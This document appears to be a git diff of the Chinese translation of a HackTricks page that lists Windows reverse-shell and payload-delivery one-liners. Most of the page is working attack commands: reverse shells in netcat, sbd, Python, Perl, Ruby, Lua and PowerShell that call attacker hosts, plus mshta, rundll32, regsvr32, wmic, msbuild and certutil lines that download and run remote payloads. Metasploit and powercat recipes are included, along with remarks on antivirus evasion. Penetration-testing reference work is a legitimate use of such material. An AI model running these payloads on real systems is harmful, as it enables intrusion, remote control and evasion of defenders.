@@ -8,15 +8,15 @@
 
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-找到最重要的漏洞，以便更快修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -33,32 +33,42 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**sbd**是Netcat的克隆版，旨在具有便携性并提供强大的加密功能。它可在类Unix操作系统和Microsoft Win32上运行。sbd具有AES-CBC-128 + HMAC-SHA1加密（由Christophe Devine提供）、程序执行（-e选项）、选择源端口、带延迟的连续重新连接以及其他一些不错的功能。sbd仅支持TCP/IP通信。sbd.exe（Kali Linux发行版的一部分：/usr/share/windows-resources/sbd/sbd.exe）可作为Netcat的替代品上传到Windows系统。 
+**[sbd](https://www.kali.org/tools/sbd/)是一个便携且安全的Netcat替代品**。它适用于类Unix系统和Win32。具有强加密、程序执行、可定制源端口和持续重新连接等功能，sbd为TCP/IP通信提供了多功能解决方案。对于Windows用户，可以使用Kali Linux发行版中的sbd.exe版本作为Netcat的可靠替代品。
+```bash
+# Victims machine
+sbd -l -p 4444 -e bash -v -n
+listening on port 4444
 
+
+# Atackers
+sbd 10.10.10.10 4444
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
 ## Python
+
+Python是一种高级编程语言，常用于编写脚本和自动化任务。它具有简单易学的语法，适用于快速开发各种类型的应用程序。
 ```bash
 #Windows
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
 ## Perl
 
-Perl是一种流行的脚本语言，可用于编写各种类型的脚本和工具。Perl脚本可以在Windows系统上运行，并且可以用于编写强大的shell脚本和工具。Perl脚本通常以.pl为扩展名。Perl在Windows系统上的使用非常广泛，因此可以作为渗透测试和攻击中的有用工具。
+Perl是一种流行的脚本语言，可用于编写各种类型的脚本和工具。Perl脚本可以在Windows系统上运行，并且可以用于编写强大的shell脚本和工具。Perl通常被用于系统管理、网络编程和安全测试等领域。
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-### Ruby
-
-Ruby是一种动态、开源的面向对象编程语言，具有简洁而优雅的语法。Ruby广泛用于Web开发，特别是在Ruby on Rails框架中。
+## Ruby
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
 
-Lua是一种轻量级、高效的脚本语言，常用于嵌入式系统和游戏开发中。 Lua脚本可以通过解释器直接执行，也可以编译成字节码运行。 Lua具有简洁的语法和强大的扩展能力，被广泛应用于各种领域。 Lua脚本可以通过调用C函数扩展其功能，使其更加灵活和强大。
+Lua是一种轻量级、高效的脚本语言，常用于嵌入式系统和游戏开发中。 Lua脚本可以通过各种方式执行，包括使用Lua解释器、LuaJIT和其他工具。 Lua脚本可以用于执行各种任务，包括系统管理、数据处理和自动化。 Lua脚本通常以.lua为文件扩展名。
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -92,40 +102,39 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/Power
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-网络调用执行的进程：**svchost.exe**\
-写入磁盘的有效载荷：**WebDAV客户端本地缓存**
+**网络调用执行的进程：** **svchost.exe**\
+**写入磁盘的有效载荷：** **WebDAV客户端本地缓存**
+
+**一句话：**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**在本文末尾获取有关不同Powershell Shells的更多信息**
+**在本文末尾获取有关不同Powershell Shell的更多信息**
 
 ## Mshta
+
+* [从这里](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
-执行网络调用的进程：**mshta.exe**\
-写入磁盘的载荷：**IE 本地缓存**
+
 ```bash
 mshta http://webserver/payload.hta
 ```
-执行网络调用的进程：**mshta.exe**\
-写入磁盘的载荷：**IE 本地缓存**
+
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-执行网络调用的进程：**svchost.exe**\
-写入磁盘的有效载荷：**WebDAV客户端本地缓存**
-
-#### **hta-psh反向shell示例（使用hta下载并执行PS后门）**
-```markup
+#### **hta-psh反向外壳示例（使用hta下载并执行PS后门）**
+```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**您可以使用stager hta非常容易地下载并执行Koadic僵尸程序**
+**您可以非常容易地使用stager hta下载并执行Koadic僵尸程序**
 
 #### hta示例
 
 [**从这里**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
-```markup
+```xml
 <html>
 <head>
 <HTA:APPLICATION ID="HelloExample">
@@ -142,7 +151,7 @@ new ActiveXObject('WScript.Shell').Run(c);
 #### **mshta - sct**
 
 [**从这里**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
-```markup
+```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
 <!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
@@ -159,9 +168,7 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ```
 #### **Mshta - Metasploit**
 
-#### Mshta - Metasploit
-
-Mshta is a utility in Windows that executes Microsoft HTML Applications (HTA). Metasploit has a module that can be used to execute malicious HTA payloads using Mshta. This technique can be used to bypass application whitelisting since Mshta is a legitimate utility.
+Mshta is a utility in Windows that executes Microsoft HTML Applications (HTA). Metasploit has a module that can be used to execute malicious HTA payloads using mshta.exe. This technique can be used to bypass application whitelisting and execute code on a target system.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -174,26 +181,27 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 ```
 **被防御者检测到**
 
+
+
+
 ## **Rundll32**
 
 [**Dll 你好世界示例**](https://github.com/carterjones/hello-world-dll)
+
+* [从这里](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
-执行网络调用的进程：**svchost.exe**\
-写入磁盘的有效载荷：**WebDAV客户端本地缓存**
+
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-进程执行网络调用：**rundll32.exe**\
-写入磁盘的有效负载：**IE 本地缓存**
-
 **被防御者检测到**
 
 **Rundll32 - sct**
 
-[**从这里开始**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
-```bash
+[**从这里**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
 <!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
@@ -224,18 +232,14 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 ```
 ## Regsvr32
 
-## Regsvr32
+* [从这里](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
-网络调用执行的进程: **regsvr32.exe**\
-写入磁盘的载荷: **IE 本地缓存**
+
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-进程执行网络调用：**svchost.exe**\
-写入磁盘的有效载荷：**WebDAV客户端本地缓存**
-
 **被防御者检测到**
 
 #### Regsvr32 -sct
@@ -258,6 +262,8 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 </scriptlet>
 ```
 #### **Regsvr32 - Metasploit**
+
+#### **Regsvr32 - Metasploit**
 ```bash
 use multi/script/web_delivery
 set target 3
@@ -266,9 +272,11 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**您可以使用分段器regsvr轻松下载并执行Koadic僵尸**
+**您可以使用stager regsvr轻松下载并执行Koadic僵尸程序**
 
 ## Certutil
+
+* [从这里下载](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 
 下载一个B64dll，解码并执行它。
 ```bash
@@ -329,14 +337,13 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 **检测到**
 
 ## **Wmic**
-```
+
+* [从这里](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-网络调用执行的进程: **wmic.exe**\
-写入磁盘的有效载荷: **IE 本地缓存**
-
-示例 xsl 文件[在这里](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
-```
+示例xsl文件[在这里](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
 <output method="text"/>
@@ -347,19 +354,18 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 </ms:script>
 </stylesheet>
 ```
-**未被检测**
+**未被检测到**
 
-**您可以使用分段器wmic轻松下载并执行Koadic僵尸**
+**您可以使用分段器wmic非常容易地下载并执行Koadic僵尸**
 
 ## Msbuild
+
+* [从这里](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-网络调用执行的进程：**svchost.exe**\
-写入磁盘的有效载荷：**WebDAV客户端本地缓存**
-
-您可以使用此技术绕过应用程序白名单和Powershell.exe限制。因为您将被提示使用PS shell。\
-只需下载并执行此文件：[https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+你可以使用这种技术来绕过应用程序白名单和Powershell.exe限制。由于你将会收到一个PS shell提示。\
+只需下载这个文件并执行它：[https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
@@ -371,28 +377,26 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-你可以从这里下载一个基本的C#反向shell: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+你可以从这里下载一个基本的C#反向shell：[https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **未被检测**
 
 ## **Regasm/Regsvc**
-```
+
+* [从这里获取](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
-网络调用执行的进程：**svchost.exe**\
-写入磁盘的载荷：**WebDAV客户端本地缓存**
-
 **我还没有尝试过**
 
 [**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)
 
 ## Odbcconf
-```
+
+* [从这里获取](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+```bash
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
-执行网络调用的进程：**svchost.exe**\
-写入磁盘的有效载荷：**WebDAV客户端本地缓存**
-
 **我还没有尝试过**
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
@@ -423,11 +427,9 @@ Defender尚未将其检测为恶意代码（截至2019年3月4日）。
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender尚未将其检测为恶意代码（截至2019年3月4日）。
-
 **powercat提供的其他选项：**
 
-绑定shell、反向shell（TCP、UDP、DNS）、端口重定向、上传/下载、生成有效载荷、提供文件...
+绑定shell、反向shell（TCP、UDP、DNS）、端口重定向、上传/下载、生成载荷、提供文件...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -452,7 +454,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**检测到恶意代码**
+**检测为恶意代码**
 
 ### MSF-Unicorn
 
@@ -466,7 +468,7 @@ python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
 msfconsole -r unicorn.rc
 ```
-在受害者上启动一个提供_powershell\_attack.txt_文件的Web服务器并执行：
+在受害者上启动一个提供_powershell\_attack.txt_文件的Web服务器，并执行：
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -474,11 +476,11 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## 更多
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) PS控制台，预装一些具有攻击性的PS模块（加密）\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) PS控制台，预装了一些具有攻击性的PS模块（加密）\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) PS控制台，预装一些具有攻击性的PS模块和代理检测（IEX）
+WinPWN](https://github.com/SecureThisShit/WinPwn) PS控制台，预装了一些具有攻击性的PS模块和代理检测（IEX）
 
-## 参考文献
+## 参考资料
 
 * [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 * [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
@@ -486,7 +488,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS控制台，预装一些具�
 * [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
 * [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-
+* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
@@ -504,7 +506,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS控制台，预装一些具�
 
 * 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[NFT](https://opensea.io/collection/the-peass-family)收藏品
 * **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
